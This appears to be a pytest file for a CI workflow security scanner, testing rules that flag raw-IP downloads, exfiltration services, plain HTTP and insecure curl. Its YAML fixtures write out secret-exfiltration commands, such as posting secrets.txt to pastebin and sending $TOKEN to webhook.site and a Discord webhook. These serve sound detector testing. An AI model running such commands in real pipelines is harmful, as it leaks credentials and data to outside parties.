"""Tests for network detector (PG-WF-012..015)."""

from __future__ import annotations

from security.workflow.detectors.network import detect
from security.workflow.models import ParseResult
from security.workflow.parser import parse_workflow_text
from security.workflow.rules import lookup


def test_empty_or_malformed_workflow_does_not_crash() -> None:
    """Empty or unparsed result must return an empty list without raising."""
    res_none = ParseResult(workflow=None, error="Failed to parse")
    assert detect(res_none) == []

    parsed_empty = parse_workflow_text("", path="dummy.yml")
    assert detect(parsed_empty) == []


def test_pg_wf_012_positive_raw_ip_download() -> None:
    """Downloads from raw IP addresses fire PG-WF-012."""
    yaml_text = """
name: Raw IP
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl http://192.168.1.100/setup.sh
      - run: wget https://10.0.0.5:8443/binary
"""
    result = parse_workflow_text(yaml_text, path="ip.yml")
    findings = detect(result)
    wf_012 = [f for f in findings if f.rule_id == "PG-WF-012"]
    assert len(wf_012) >= 2
    rule = lookup("PG-WF-012")
    assert rule.severity.value == "MEDIUM"


def test_pg_wf_012_negative_domain_url() -> None:
    """Downloads using domain names instead of raw IP do not fire PG-WF-012."""
    yaml_text = """
name: Domain URL
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://downloads.example.com/release.tar.gz
"""
    result = parse_workflow_text(yaml_text, path="domain.yml")
    wf_012 = [f for f in detect(result) if f.rule_id == "PG-WF-012"]
    assert wf_012 == []


def test_pg_wf_013_positive_exfil_c2_services() -> None:
    """Known exfiltration or C2 services (pastebin, transfer.sh, webhook.site, discord) fire PG-WF-013."""
    yaml_text = """
name: Exfil
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl -d @secrets.txt https://pastebin.com/api/post
      - run: curl --upload-file ./data.zip https://transfer.sh/data.zip
      - run: 'curl -X POST https://webhook.site/abc-123 -d "token=$TOKEN"'
      - run: |
          curl -H "Content-Type: application/json" -d '{"content":"leak"}' https://discord.com/api/webhooks/123/xyz
"""
    result = parse_workflow_text(yaml_text, path="exfil.yml")
    findings = detect(result)
    wf_013 = [f for f in findings if f.rule_id == "PG-WF-013"]
    assert len(wf_013) == 4
    rule = lookup("PG-WF-013")
    assert rule.severity.value == "HIGH"


def test_pg_wf_013_negative_legitimate_endpoints() -> None:
    """Legitimate GitHub APIs or internal domain endpoints do not fire PG-WF-013."""
    yaml_text = """
name: Safe Endpoints
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl -H "Authorization: Bearer $TOKEN" https://api.github.com/user
"""
    result = parse_workflow_text(yaml_text, path="safe_api.yml")
    wf_013 = [f for f in detect(result) if f.rule_id == "PG-WF-013"]
    assert wf_013 == []


def test_pg_wf_014_positive_plain_http_download() -> None:
    """Non-TLS plain http:// downloads fire PG-WF-014."""
    yaml_text = """
name: Plain HTTP
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl http://insecure-downloads.example.org/archive.tar.gz
"""
    result = parse_workflow_text(yaml_text, path="http.yml")
    findings = detect(result)
    wf_014 = [f for f in findings if f.rule_id == "PG-WF-014"]
    assert len(wf_014) == 1
    rule = lookup("PG-WF-014")
    assert rule.severity.value == "LOW"


def test_pg_wf_014_negative_localhost_and_https() -> None:
    """HTTPS endpoints and local mock endpoints (localhost, 127.0.0.1) do not fire PG-WF-014."""
    yaml_text = """
name: Safe HTTP
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://secure.example.com/asset.zip
      - run: curl http://localhost:8080/health
      - run: curl http://127.0.0.1:9000/metrics
"""
    result = parse_workflow_text(yaml_text, path="safe_http.yml")
    wf_014 = [f for f in detect(result) if f.rule_id == "PG-WF-014"]
    assert wf_014 == []


def test_pg_wf_015_positive_curl_insecure() -> None:
    """curl called with -k or --insecure fires PG-WF-015."""
    yaml_text = """
name: Curl Insecure
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl -k https://self-signed.local/data
      - run: curl --insecure https://legacy.internal/api
"""
    result = parse_workflow_text(yaml_text, path="insecure.yml")
    findings = detect(result)
    wf_015 = [f for f in findings if f.rule_id == "PG-WF-015"]
    assert len(wf_015) == 2
    rule = lookup("PG-WF-015")
    assert rule.severity.value == "MEDIUM"


def test_pg_wf_015_negative_standard_curl() -> None:
    """curl without -k or --insecure does not fire PG-WF-015."""
    yaml_text = """
name: Standard Curl
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL https://trusted.example.com/release
"""
    result = parse_workflow_text(yaml_text, path="safe_curl.yml")
    wf_015 = [f for f in detect(result) if f.rule_id == "PG-WF-015"]
    assert wf_015 == []


def test_network_findings_deterministic_fingerprint() -> None:
    """Network detector findings produce deterministic fingerprints."""
    yaml_text = """
name: Deter Network
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl -k https://test.local
"""
    f1 = detect(parse_workflow_text(yaml_text, path="deter.yml"))
    f2 = detect(parse_workflow_text(yaml_text, path="deter.yml"))
    assert len(f1) == 1 and len(f2) == 1
    assert f1[0].fingerprint() == f2[0].fingerprint()
